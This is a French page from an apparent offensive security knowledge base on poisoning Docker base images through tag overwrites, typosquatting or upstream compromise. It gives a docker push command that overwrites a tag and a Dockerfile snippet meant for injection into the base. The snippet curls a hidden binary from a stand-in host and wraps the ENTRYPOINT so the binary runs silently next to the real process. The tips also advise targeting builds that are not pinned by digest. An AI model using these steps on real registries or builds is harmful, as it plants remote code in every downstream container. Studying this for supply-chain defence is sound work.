---
order: 6
title: "Empoisonnement d'image de base : compromettre l'amont pour atteindre tous les builds en aval"
description: "Les images sont construites FROM une image de base. Un attaquant qui contrôle ou peut usurper une image de base, via un dépôt amont compromis, un nom typosquatté ou un tag mutable qu'il peut écraser, injecte du code hérité par chaque image construite dessus, transformant une seule compromission en exécution sur l'ensemble des builds et déploiements en aval."
keywords:
  - image de base
  - chaîne d'approvisionnement
  - typosquatting
  - tag mutable
  - dockerfile from
---

# Empoisonnement d'image de base

Chaque Dockerfile commence par `FROM <base>`, et l'image résultante hérite du système de fichiers et de la configuration de cette base. Empoisonner la base est donc un multiplicateur de la chaîne d'approvisionnement : un seul changement malveillant se propage dans chaque image qui s'appuie dessus, et de là dans chaque conteneur que ces images exécutent. L'objectif de l'attaquant est de faire entrer son contenu dans une base que les builds en aval tirent.

## Voies pour contrôler une base

```bash
# 1. Overwrite a mutable tag the downstream pulls by name (no digest pin).
#    If the registry accepts the push, the next build FROM base:latest gets it.
docker tag malicious base:latest && docker push <registry>/base:latest

# 2. Typosquat a popular base name so a mistyped FROM pulls the attacker image.
#    e.g. publish "ubunutu" or "node-alpine" to a public namespace.

# 3. Compromise the upstream build or repository that produces the base,
#    inserting a layer that runs attacker code or adds a backdoor.
```

La raison pour laquelle l'écrasement de tag fonctionne est que `FROM base:latest` résout le tag au moment du build, de sorte que ce vers quoi le tag pointe quand le build s'exécute est ce qui est hérité ; les builds qui n'épinglent pas un digest sont exposés.

## Ce que porte la base empoisonnée

```dockerfile
# injected into the base so every downstream inherits it
RUN curl -s http://a/agent -o /usr/local/bin/.a && chmod +x /usr/local/bin/.a
ENTRYPOINT ["/bin/sh","-c","/usr/local/bin/.a & exec \"$@\"","--"]
```

Un wrapper d'entrypoint lance la charge utile de l'attaquant aux côtés du vrai processus, de sorte que les conteneurs en aval s'exécutent normalement tout en exécutant aussi le code de l'attaquant.

## Notes d'exploitation

- Les tags mutables sont l'élément déclencheur clé ; un aval qui épingle `FROM base@sha256:<digest>` est immunisé contre l'écrasement de tag, alors ciblez les builds qui tirent par tag.
- Le typosquatting réussit sur les registres publics où n'importe quel nom peut être publié ; des noms à une édition près des bases populaires attrapent les lignes `FROM` mal tapées ou auto-complétées.
- La charge utile a sa place dans l'entrypoint de la base ou dans une couche précoce afin d'être héritée et de s'exécuter à chaque lancement en aval ; voir [Image backdooring](image-backdooring.md) pour l'équivalent sur une seule image.

## Références

- [SLSA: supply-chain threats](https://slsa.dev/spec/v1.0/threats)
- [Docker: pin base images by digest](https://docs.docker.com/build/building/best-practices/)
- [Sysdig: container supply chain attacks](https://sysdig.com/learn-cloud-native/)
